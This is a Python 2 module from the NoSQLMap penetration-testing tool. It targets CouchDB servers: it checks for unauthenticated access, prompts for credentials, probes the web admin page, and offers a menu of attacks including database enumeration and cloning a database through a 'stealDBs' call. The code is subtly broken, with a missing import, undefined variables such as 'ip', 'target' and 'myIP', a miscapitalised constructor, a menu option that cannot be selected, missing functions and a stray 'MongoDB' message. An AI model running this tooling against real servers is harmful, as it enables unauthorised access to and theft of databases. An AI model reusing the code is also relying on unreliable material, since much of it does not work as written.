#!/usr/bin/python
#NoSQLMap Copyright 2014 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.



import couchdb
import urllib


def couchScan(target,port,pingIt):
    if pingIt == True:
        test = os.system("ping -c 1 -n -W 1 " + ip + ">/dev/null")

        if test == 0:	
            try:
                conn = couchdb.Server("http://" + str(target) + ":5984/", timeout=4000)

                try:
                    dbVer = conn.version()
                    return [0,dbVer]
                
                except couchdb.http.Unauthorized:
                    return [1,None]

                except:
                    return [2,None]

            except:
                return [3,None]

        else:
            return [4,None]

    else:
        try:
            conn = couchdb.Server("http://" + str(target) + ":5984/")

            try:
                dbVer = conn.version()
                return [0,dbVer]
            
            except couchdb.http.Unauthorized:
                return [1,None]

            except:
                return [2,None]

        except:
            return [3,None]
        
        
def netAttacks(target,port):
    print "DB Access attacks (CouchDB)"
    print "======================"
    mgtOpen = False
    webOpen = False
    mgtSelect = True
    #This is a global for future use with other modules; may change
    dbList = []
    
    print "Checking to see if credentials are needed..."
    needCreds = couchScan(target,port,False)

    if needCreds[0] == 0:
        conn = couchdb.Server("http://" + str(target) + ":5984/")
        print "Successful access with no credentials!"
        mgtOpen = True

    elif needCreds[0] == 1:
            print "Login required!"
            srvUser = raw_input("Enter server username: ")
            srvPass = raw_input("Enter server password: ")
            uri = "http://" + srvUser + ":" + srvPass + "@" + target + ":5984/"
            
            try:
                conn = couchdb.server(uri)
                print "CouchDB authenticated on " + target + ":5984!"
                mgtOpen = True

            except:
                raw_input("Failed to authenticate.  Press enter to continue...")
                return
    
    elif needCreds[0] == 2:
        couchdb.Server("http://" + str(target) + ":5984/")
        print "Access check failure.  Testing will continue but will be unreliable."
        mgtOpen = True

    elif needCreds[0] == 3:
        print "Couldn't connect to CouchDB server."
        return

	
    mgtUrl = "http://" + target + ":5984/_utils"	
    #Future rev:  Add web management interface parsing
    try:
        mgtRespCode = urllib.urlopen(mgtUrl).getcode()
        if mgtRespCode == 200:
            print "Sofa web management open at " + mgtUrl + ".  No authentication required!"

    except:
        print "MongoDB web management closed or requires authentication."
    
    if mgtOpen == True:
        while mgtSelect:
            print "\n"
            print "1-Get Server Version and Platform"
            print "2-Enumerate Databases/Collections/Users"
            print "3-Check for Attachments"
            print "4-Clone a Database"
            print "5-Return to Main Menu"
            attack = raw_input("Select an attack: ")

            if attack == "1":
                print "\n"
                getPlatInfo(conn)
                
            if attack == "2":
                print "\n"
                enumDbs(conn)

            if attack == "3":
                print "\n"
                enumGrid(conn)
                
            if attack == "4":
                if optionSet[4] == False:
                    print "Target database not set!"

                else:
                    print "\n"
                    stealDBs(myIP,conn)

            if attack == "6":
                    return
                
def getPlatInfo(couchConn):
    	print "Server Info:"
        print "CouchDB Version: " + couchConn.version()
        print "Configuration File:\n"
        print str(urllib.urlopen("http://" + target + ":5984/_config"))
        print "\n"
        return